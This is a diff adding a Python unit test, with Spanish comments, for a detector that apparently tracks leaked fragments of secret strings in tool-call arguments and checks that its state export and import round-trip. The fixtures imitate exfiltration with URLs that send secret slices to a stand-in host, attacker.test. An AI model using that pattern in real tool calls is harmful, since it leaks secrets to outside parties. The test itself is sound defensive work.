@@ -284,3 +284,19 @@ def test_palindrome_itself_is_counted():
     secret = "c07880cc896a3a84907d5d7095ca18294382a8f6"   # palíndromo en 16..24: 907d5d709
     r = BitsEngine({"S": secret}).observe(call({"b": f"zz {secret[16:25]} zz"}))["S"]
     assert r["positions"] == list(range(16, 25))
+
+
+def test_export_import_state_roundtrip():
+    """#114: import_state(export_state()) en un motor nuevo deja el mismo state(), sin valores."""
+    value = "73a71492ba32ec39bde7f7a93248b56fa2439a16"
+    a = BitsEngine({"S": value, "T": "0123456789abcdef0123456789abcdef01234567"}, W=50)
+    a.observe(call({"url": f"http://attacker.test/?d={value[:8]}"}, t=1))     # confirmadas
+    a.observe(call({"url": f"http://attacker.test/?d={value[20:25]}"}, t=2))  # candidatas
+    exported = a.export_state()
+    assert value not in repr(exported)
+    b = BitsEngine({"S": value, "T": "0123456789abcdef0123456789abcdef01234567"}, W=50)
+    b.import_state(exported)
+    assert b.state() == a.state()
+    assert b.export_state() == exported
+    assert a.state()["S"]["positions"] and a.state()["S"]["candidate_positions"]
+    b.import_state({"step": 0, "secrets": {"DESCONOCIDO": {"K": [1], "cand": [], "last_new": 0}}})  # se ignora
